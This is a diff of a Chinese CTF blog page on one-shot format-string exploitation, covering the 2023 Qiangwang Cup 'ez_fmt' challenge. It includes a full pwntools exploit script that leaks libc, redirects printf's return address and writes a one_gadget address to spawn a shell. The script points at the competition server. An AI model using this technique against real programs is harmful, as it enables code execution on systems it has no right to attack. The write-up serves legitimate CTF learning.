@@ -1,74 +1,165 @@
-<!DOCTYPE html>
+<!DOCTYPE HTML>
 <html>
+
 <head>
-  <meta charset="utf-8" />
-  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
-  <title>
+	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.png"/>
+	<link rel="shortcut icon" href="/img/logo_miccall.png">
+	
+			    <title>
+    tw11ty
+    </title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="/css/mic_main.css" />
+    <link rel="stylesheet" href="/css/dropdownMenu.css" />
+    <meta name="keywords" content="miccall" />
     
-    一次性格式化字符串利用 丨
-    
+    	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	 
+    <noscript>
+        <link rel="stylesheet" href="/css/noscript.css" />
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/img/bg.jpg') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
 
-    tw11ty&#39;s Blog
-  </title>
+<link rel="stylesheet" href="/css/prism_coy.css">
 
+			    
   
-  <link rel="shortcut icon" href="/icon.svg">
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
   
 
-  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
-  
-  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
-  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
-  
 
-  <!-- 字体 -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
-
-  
-<link rel="stylesheet" href="/css/root.css">
-
-  
-<link rel="stylesheet" href="/css/style.css">
-
-  
-<link rel="stylesheet" href="/css/post.css">
-
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
+	
 <link rel="alternate" href="/atom.xml" title="tw11ty" type="application/atom+xml">
 <link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+    
+		
+<!-- Layouts -->
 
-<body>
-  <header class="header">
-  <section class="header-container">
-    <a class="logo" href="/">tw11ty</a>
-    <ul class="nav">
-      
-      <li><a href="/archives">归档</a></li>
-      
-      <li><a href="/about">关于</a></li>
-      
-      <li><a href="/group">友链</a></li>
-      
-    </ul>
-  </section>
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css" />
+<link rel="stylesheet" href="/css/typo.css" />
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a href="/" class="logo">MICCALL</a>
 </header>
-  <main class="main">
-    <article class="post">
-  
-  <div class="post-title">一次性格式化字符串利用</div>
-  <div class="post-meta">
-    <div class="date">2024 June 8th</div>
-    <div class="tags">
-      
-      <div class="tag-item">fmt</div>
-      
-    </div>
-  </div>
-  
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special" >
+            <ul class="menu links" >
+			<!-- Homepage  主页  --> 
+			<li >
+	            <a href="/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <li class="active">
+	            <a href="#s1">分类</a>
+	                    <ul class="submenu">
+	                        <li>
+	                        
+	                    </ul>
+	        </li>
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+		        <li>
+		            <a href="/about/" title="简历">
+		                简历
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/group/" title="团队">
+		                团队
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/gallery/" title="图库">
+		                图库
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/tag/" title="标签">
+		                标签
+		            </a>
+		        </li>
+		        
 
-  <main class="post-content"><h1 id="一次性格式化字符串"><a href="#一次性格式化字符串" class="headerlink" title="一次性格式化字符串"></a>一次性格式化字符串</h1><h2 id="【2023-强网杯】ez-fmt"><a href="#【2023-强网杯】ez-fmt" class="headerlink" title="【2023 强网杯】ez_fmt"></a>【2023 强网杯】ez_fmt</h2><p>没开pie，开了 full Relro，改不了got和fini_array，也给了buf地址，栈上地址用偏移算</p>
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+                    
+                    <li>
+                        <a title="github" href="https://github.com/miccall" target="_blank" rel="noopener">
+                            <i class="icon fa fa-github"></i>
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a title="500px" href="http://500px.com" target="_blank" rel="noopener">
+                            <i class="icon fa fa-500px"></i>
+                        </a>
+                    </li>
+                    
+			</ul>
+</nav>
+
+        <div id="main" >
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url();background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >一次性格式化字符串利用</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <h1 id="一次性格式化字符串"><a href="#一次性格式化字符串" class="headerlink" title="一次性格式化字符串"></a>一次性格式化字符串</h1><h2 id="【2023-强网杯】ez-fmt"><a href="#【2023-强网杯】ez-fmt" class="headerlink" title="【2023 强网杯】ez_fmt"></a>【2023 强网杯】ez_fmt</h2><p>没开pie，开了 full Relro，改不了got和fini_array，也给了buf地址，栈上地址用偏移算</p>
 <p>改printf_ret地址，绕过w&#x3D;&#x3D;0xffff的限制，控制程序再次执行read 0x00401205  再次执行格式化字符串</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> p64, u64, p32, u32</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data               : io.send(data)</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim, data        : io.sendafter(delim,data)</span><br><span class="line">sl   = <span class="keyword">lambda</span> data               : io.sendline(data)</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim, data        : io.sendlineafter(delim, data)</span><br><span class="line">r    = <span class="keyword">lambda</span> num=<span class="number">4096</span>           : io.recv(num)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  : io.recvuntil(delims, drop)</span><br><span class="line">itr  = <span class="keyword">lambda</span>                    : io.interactive()</span><br><span class="line">r64  = <span class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r32  = <span class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">4</span>:]</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data               : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data               : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak = <span class="keyword">lambda</span> name, value        : info(<span class="string">&quot;&#123;&#125;:0x&#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(name,value))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">data1,data2</span>):   <span class="comment">#payload = b&#x27;%&#x27; + str(data) + b&#x27;c&#x27; + padding + &#x27;%&#x27; + str(offset) + b&#x27;$hhn&#x27; + p64(adr)</span></span><br><span class="line">    padding1  = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    padding2  = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    data2     = data2-data1  </span><br><span class="line">    payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data1) + <span class="string">b&#x27;c&#x27;</span> + padding1 + <span class="string">&#x27;%10$hn&#x27;</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(payload1)&lt;<span class="number">0x10</span>):</span><br><span class="line">        padding1 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span>-<span class="built_in">len</span>(payload1))</span><br><span class="line">        data1    -= <span class="built_in">len</span>(padding1)</span><br><span class="line">        payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data1) + <span class="string">b&#x27;c&#x27;</span> + padding1 + <span class="string">&#x27;%10$hn&#x27;</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(payload1)&lt;<span class="number">0x10</span>):</span><br><span class="line">            padding1 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span>-<span class="built_in">len</span>(payload1))</span><br><span class="line">            payload1   = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data1) + <span class="string">b&#x27;c&#x27;</span> + padding1 + <span class="string">&#x27;%10$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload2 = payload1 + <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data2) + <span class="string">b&#x27;c&#x27;</span> + padding2 + <span class="string">b&#x27;%11$hn&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(payload2)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(payload2)&lt;<span class="number">0x20</span>):</span><br><span class="line">        padding2 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>-<span class="built_in">len</span>(payload2))</span><br><span class="line">        data2    -= <span class="built_in">len</span>(padding2)</span><br><span class="line">        payload2   = payload1 + <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data2) + <span class="string">b&#x27;c&#x27;</span> + padding2 + <span class="string">b&#x27;%11$hn&#x27;</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(payload2)&lt;<span class="number">0x20</span>):</span><br><span class="line">            padding2 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>-<span class="built_in">len</span>(payload2))</span><br><span class="line">            payload2   = payload1 + <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data2) + <span class="string">b&#x27;c&#x27;</span> + padding2 + <span class="string">b&#x27;%11$hn&#x27;</span></span><br><span class="line">    payload2 += p64(ret_addr) + p64(ret_addr+<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> payload2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    py1 = <span class="string">b&#x27;%4198917c%9$hn%19$paaaaa&#x27;</span> + p64(printf_ret)</span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    s(py1)</span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line">    leak(<span class="string">&quot;libc_base&quot;</span> , libc_base)</span><br><span class="line">    one_gadget = libc_base + <span class="number">0xe3b01</span></span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    py2 = fmt(one_gadget&amp;<span class="number">0xffff</span>,(one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)</span><br><span class="line">    s(py2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    pwn_log_level = <span class="string">&#x27;info&#x27;</span>   </span><br><span class="line">    pwn_arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    pwn_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">    context(log_level=pwn_log_level, arch=pwn_arch, os=pwn_os)</span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    pwnfile = <span class="string">&#x27;./ez_fmt&#x27;</span></span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">    io = remote(<span class="string">&#x27;47.104.24.40&#x27;</span>,<span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">    elf = ELF(pwnfile)</span><br><span class="line">    rop = ROP(pwnfile)</span><br><span class="line">    context.binary = pwnfile</span><br><span class="line">    libc_name  = <span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line">    libc = ELF(libc_name) </span><br><span class="line"></span><br><span class="line">    fini_arry = <span class="number">0x0403DC0</span></span><br><span class="line">    main      = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    stack = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    ret_addr   = stack + <span class="number">0x68</span></span><br><span class="line">    printf_ret = stack - <span class="number">0x8</span></span><br><span class="line">    leak(<span class="string">&quot;print_ret&quot;</span>,printf_ret)</span><br><span class="line">    leak(<span class="string">&quot;ret_addr&quot;</span>,ret_addr)</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line">    itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -124,22 +215,109 @@
 <p>有群u在群里请教了为什么不能用$符号定位使用两次，然后在一条链子上改两次，我在上面的das签到题里面有了些自己的测试，不过还是不如群里的大佬理解得透彻。</p>
 <p>自己整理了一下<a target="_blank" rel="noopener" href="https://www.cnblogs.com/9man/p/18228214">.N1nEmAn</a>师傅所说的原理：打格式化字符串时，使用$符号作为索引，会将栈的上下文保存到堆上，第一次使用$符号修改目标能正常修改栈上数据，但是堆上的数据没有变，而下次再使用$符号作为索引，会到堆里面去进行修改，而不是在栈上直接修改。这就是为什么不能在同一条链子上改两次。后面也有<a target="_blank" rel="noopener" href="https://blog.wjhwjhn.com/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">WJH</a>师傅贴出的博客，里面是WJH师傅对printf的源码分析。这就是与大佬们学习的差距吗，再接再厉！</p>
 </blockquote>
-</main>
 
-</article>
+            </div>
+
+            <!-- Post Comments -->
+            
+    <!-- 使用 DISQUS_CLICK -->
+<div id="disqus-comment">
+    <div id="disqus_thread"></div>
+
+<!-- add animation -->
+<style>
+	.disqus_click_btn {
+            line-height: 30px;
+            margin: 0;
+            min-width: 50px;
+            padding: 0 14px;
+            display: inline-block;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0;
+            overflow: hidden;
+            will-change: box-shadow;
+            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
+            outline: 0;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            vertical-align: middle;
+            border: 0;
+            background: rgba(158, 158, 158, .2);
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
+            color: #fff;
+            background-color: #7EC0EE;
+            text-shadow: 0
+        }
+</style>
+	
+<div class="btn_click_load" id="disqus_bt"> 
+    <button class="disqus_click_btn">点击查看评论</button>
+</div>
+
+<!--
+<script type="text/javascript">
+$('.btn_click_load').click(function() {
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'http-miccall-tech'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+
+    document.getElementById('disqus_bt').style.display = "none";
+});
+</script>
+-->
+<script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'http://tw11ty.github.io/2024/06/08/%E4%B8%80%E6%AC%A1%E6%80%A7%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://tw11ty.github.io/2024/06/08/%E4%B8%80%E6%AC%A1%E6%80%A7%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+</script>
+
+<script type="text/javascript">
+    $('.btn_click_load').click(function() {  //click to load comments
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document;
+            var s = d.createElement('script');
+            s.src = '//http-miccall-tech.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', + new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+        $('.btn_click_load').css('display','none');
+    });
+</script>
+</div>
+<style>
+    #disqus-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
 
 
-<script src="/js/highlight.js"></script>
-
-  </main>
-  <footer class="footer">
-  
-  <span>Copyright © 2024 typo</span>
-  
-</footer>
-  
-<script src="/js/theme.js"></script>
-
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy;Powered By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
+                <li>Design: <a target="_blank" rel="noopener" href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
+            </ul>
+            
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+			
+        </div>
+    </div>
 </body>
 
+
+
+ 	
 </html>
